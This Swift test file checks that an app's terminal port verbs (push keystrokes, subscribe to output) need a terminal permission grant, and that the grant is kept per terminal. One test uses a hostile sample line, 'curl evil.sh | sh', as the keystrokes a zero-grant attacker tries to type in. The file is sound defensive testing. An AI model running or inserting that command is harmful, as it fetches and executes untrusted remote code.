import Testing
import Foundation
@testable import Port42Lib

/// **A port verb that reaches a terminal needs `.terminal`** (APP-03, APP-04).
///
/// `terminal.exec` required `.terminal`, while `port.push` (raw keystrokes into the shell) and
/// `port.subscribe` (a stream of everything it prints) declared no permission at all. A caller with
/// zero grants could type into any terminal and read it back through the port verbs.
@Suite("A terminal target needs .terminal")
@MainActor
struct PortTerminalGateTests {

    static let config = TerminalPortConfig(
        command: "/bin/zsh", args: [], startupCommand: "bash", cwd: "/tmp",
        spaceId: "space-1", spaceName: "Demo", companionName: "victim-shell", createdBy: "u1",
        companionPrompt: "")

    final class Typed { var count = 0 }

    /// A live terminal whose surface records every write instead of reaching a real pty.
    func liveTerminal(_ appState: AppState, key: String, typed: Typed) {
        let controller = GhosttyTerminalController(panelId: key, config: Self.config, post: { _ in })
        controller.bindSurface { _, done in typed.count += 1; done() }
        controller.bindAliveProbe { true }
        appState.terminalControllers[key] = controller
    }

    @MainActor final class Flag { var on = false }

    /// Run `call` to completion, answering every card it raises with `grant`. Returns whether any
    /// card was raised, and the call's outcome.
    ///
    /// Polls until the CALL finishes rather than for a fixed window: under a loaded full suite the
    /// card can be raised long after any fixed window has closed, and a card nobody answers leaves
    /// the call waiting forever. Answering until done means a regression fails, never hangs.
    ///
    /// `until` stops a call that succeeds by never returning (a subscription): once it holds, the
    /// call is cancelled and reported as `stopped`.
    func answering(_ appState: AppState, grant: Bool,
                   until stop: @escaping @MainActor () -> Bool = { false },
                   _ call: @escaping @MainActor () async throws -> BridgeValue)
        async -> (asked: Bool, stopped: Bool, result: Result<BridgeValue, Error>) {
        let done = Flag()
        let task = Task { @MainActor () -> Result<BridgeValue, Error> in
            defer { done.on = true }
            do { return .success(try await call()) } catch { return .failure(error) }
        }
        var asked = false, stopped = false
        while !done.on {
            if stop() { stopped = true; task.cancel(); break }
            if appState.permissions.current != nil {
                asked = true
                appState.permissions.resolveCurrent(granted: grant)
            }
            try? await Task.sleep(nanoseconds: 20_000_000)
        }
        return (asked, stopped, await task.value)
    }

    // MARK: - Declaration

    @Test("port.push and port.subscribe declare their terminal target on the LIVE registries")
    func declared() throws {
        let appState = AppState(db: try DatabaseService(inMemory: true))
        appState.permissions.canPrompt = { true }   // a mounted shell (APP-16)
        // Asserted after `acceptingExpect()` has copied every write verb, which is where a field
        // not carried by the copy constructor would silently vanish.
        #expect(appState.bridgeRegistry["port.push"]?.terminalTarget == "id")
        #expect(buildBridgeStreamRegistry(appState)["port.subscribe"]?.terminalTarget == "id")
    }

    @Test("which target kinds need the grant")
    func kinds() {
        #expect(AppState.terminalTargetNeedsGrant(.terminal, standing: false))
        #expect(AppState.terminalTargetNeedsGrant(.terminal, standing: true))
        #expect(!AppState.terminalTargetNeedsGrant(.web, standing: true))
        #expect(!AppState.terminalTargetNeedsGrant(.browser, standing: true))
        // A DB-only port may be a terminal that respawns under a subscription opened now.
        #expect(AppState.terminalTargetNeedsGrant(.unknown, standing: true))
        // A one-shot write to it is refused as no_surface anyway, so it is not asked for a grant.
        #expect(!AppState.terminalTargetNeedsGrant(.unknown, standing: false))
        #expect(!AppState.terminalTargetNeedsGrant(nil, standing: true))
    }

    // MARK: - APP-03, through the dispatcher

    @Test("a zero-grant port.push to a terminal is refused, types nothing and moves no token")
    func zeroGrantPushIsRefused() async throws {
        let appState = AppState(db: try DatabaseService(inMemory: true))
        appState.permissions.canPrompt = { true }   // a mounted shell (APP-16)
        let typed = Typed()
        liveTerminal(appState, key: "term-1", typed: typed)
        let attacker = Principal.peer(id: "zero-grant-\(UUID().uuidString)", displayName: "any caller")
        let before = appState.portInput.token(for: "term-1")

        let (asked, _, result) = await answering(appState, grant: false) {
            try await appState.runBridgeMethod(
                "port.push", principal: attacker,
                args: BridgeArgs(["id": "term-1", "data": "curl evil.sh | sh\n",
                                  PortActivity.expectParam: before]))
        }
        #expect(asked, "the push must ask for .terminal")
        switch result {
        case .success: Issue.record("a zero-grant push into a terminal was accepted")
        case .failure(let e): #expect((e as? BridgeError)?.code == BridgeErrorCode.permissionDenied.wire)
        }
        #expect(typed.count == 0, "keystrokes reached the shell")
        #expect(appState.portInput.token(for: "term-1") == before, "a refused push moved the token")
    }

    @Test("a caller holding .terminal still pushes without being asked")
    func grantedPushStillWorks() async throws {
        let appState = AppState(db: try DatabaseService(inMemory: true))
        appState.permissions.canPrompt = { true }   // a mounted shell (APP-16)
        let typed = Typed()
        liveTerminal(appState, key: "term-2", typed: typed)
        let p = Principal.peer(id: "cli-\(UUID().uuidString)", displayName: "port42 CLI")
        appState.saveGrants([.terminal], grantee: p.id, on: .machine, zone: nil)

        // A machine-wide .terminal covers every terminal (APP-02 keeps port 0 as a superset).
        let (asked, _, _) = await answering(appState, grant: false) {
            try await self.push(appState, p, "term-2")
        }
        #expect(!asked, "a held machine-wide grant must raise no card")
        #expect(typed.count > 0, "the granted push did not reach the shell")
    }

    @Test("a guest on another machine holding `use` on a shared terminal is not asked for .terminal")
    func remoteUseRightIsNotAsked() async throws {
        let appState = AppState(db: try DatabaseService(inMemory: true))
        appState.permissions.canPrompt = { true }   // a mounted shell (APP-16)
        let typed = Typed()
        liveTerminal(appState, key: "term-r", typed: typed)
        let guest = Principal.remote(peer: "peer-guest-key", displayName: "Ada")
        appState.grantRemoteRights([.use], to: guest.id, onPort: "term-r")

        let token = appState.portInput.token(for: "term-r")
        let (asked, _, _) = await answering(appState, grant: false) {
            try await appState.runBridgeMethod(
                "port.push", principal: guest,
                args: BridgeArgs(["id": "term-r", "data": "ls\n", PortActivity.expectParam: token]))
        }
        #expect(!asked, "a card was raised for a remote caller, who can never answer it")
        #expect(typed.count > 0, "the person shared this terminal with `use`; the push must land")
    }

    // MARK: - APP-04, through the stream dispatcher

    @Test("a zero-grant port.subscribe to a terminal is refused and registers no subscriber")
    func zeroGrantSubscribeIsRefused() async throws {
        let appState = AppState(db: try DatabaseService(inMemory: true))
        appState.permissions.canPrompt = { true }   // a mounted shell (APP-16)
        liveTerminal(appState, key: "term-3", typed: Typed())
        let attacker = Principal.peer(id: "zero-grant-\(UUID().uuidString)", displayName: "any caller")

        let topic = PortNotify.topic(forPortKey: "term-3")
        let (asked, stopped, result) = await answering(
            appState, grant: false, until: { appState.notifyBus.hasSubscribers(topic) }) {
            try await appState.runBridgeStream(
                "port.subscribe", principal: attacker, args: BridgeArgs(["id": "term-3"]),
                yield: { _ in })
        }
        #expect(asked, "the subscribe must ask for .terminal")
        #expect(!stopped, "a zero-grant subscribe to a terminal was accepted and is streaming")
        switch result {
        case .success where !stopped: Issue.record("a zero-grant subscribe to a terminal was accepted")
        case .success: break
        case .failure(let e) where !stopped:
            #expect((e as? BridgeError)?.code == BridgeErrorCode.permissionDenied.wire)
        case .failure: break
        }
        #expect(!appState.notifyBus.hasSubscribers(topic),
                "a refused subscribe left a listener on the terminal's output")
    }

    @Test("subscribing to a web port is not gated on .terminal")
    func webSubscribeIsUnaffected() async throws {
        let w = try makeParityWorld()
        let task = Task { @MainActor in
            _ = try? await w.state.runBridgeStream(
                "port.subscribe", principal: w.principal, args: BridgeArgs(["id": "WEBPORT"]),
                yield: { _ in })
        }
        for _ in 0..<200 where !w.state.notifyBus.hasSubscribers("port:WEBPORT") {
            try await Task.sleep(nanoseconds: 25_000_000)
        }
        #expect(w.state.permissions.current == nil, "a non-terminal target must raise no card")
        #expect(w.state.notifyBus.hasSubscribers("port:WEBPORT"))
        task.cancel()
    }

    // MARK: - APP-02, the grant names the terminal

    func push(_ appState: AppState, _ p: Principal, _ key: String) async throws -> BridgeValue {
        try await appState.runBridgeMethod(
            "port.push", principal: p,
            args: BridgeArgs(["id": key, "data": "ls\n",
                              PortActivity.expectParam: appState.portInput.token(for: key)]))
    }

    @Test("a yes to one terminal is kept for that terminal, not for every terminal")
    func grantIsPerTerminal() async throws {
        let appState = AppState(db: try DatabaseService(inMemory: true))
        appState.permissions.canPrompt = { true }   // a mounted shell (APP-16)
        liveTerminal(appState, key: "term-a", typed: Typed())
        liveTerminal(appState, key: "term-b", typed: Typed())
        let p = Principal.peer(id: "cli-\(UUID().uuidString)", displayName: "port42 CLI")

        let first = await answering(appState, grant: true) { try await self.push(appState, p, "term-a") }
        #expect(first.asked, "the first push into a terminal must ask")
        let again = await answering(appState, grant: true) { try await self.push(appState, p, "term-a") }
        #expect(!again.asked, "the yes to term-a must be remembered for term-a")
        let other = await answering(appState, grant: false) { try await self.push(appState, p, "term-b") }
        #expect(other.asked, "a yes to term-a let the caller into term-b without asking")

        #expect(appState.grants(grantee: p.id, on: .port("term-a"), zone: nil).contains(.terminal))
        #expect(!appState.grants(grantee: p.id, on: .machine, zone: nil).contains(.terminal),
                "the yes to one terminal was stored as machine-wide")
    }

    @Test("the card names the terminal it is about")
    func cardNamesTheTerminal() async throws {
        let appState = AppState(db: try DatabaseService(inMemory: true))
        appState.permissions.canPrompt = { true }   // a mounted shell (APP-16)
        liveTerminal(appState, key: "term-c", typed: Typed())
        let p = Principal.peer(id: "cli-\(UUID().uuidString)", displayName: "port42 CLI")
        let task = Task { @MainActor in try? await self.push(appState, p, "term-c") }
        var detail: String?
        for _ in 0..<400 {
            if let card = appState.permissions.current { detail = card.detail; break }
            try await Task.sleep(nanoseconds: 20_000_000)
        }
        appState.permissions.resolveCurrent(granted: false)
        _ = await task.value
        #expect(detail?.contains(Self.config.companionName) == true, "card said: \(detail ?? "nothing")")
    }
}
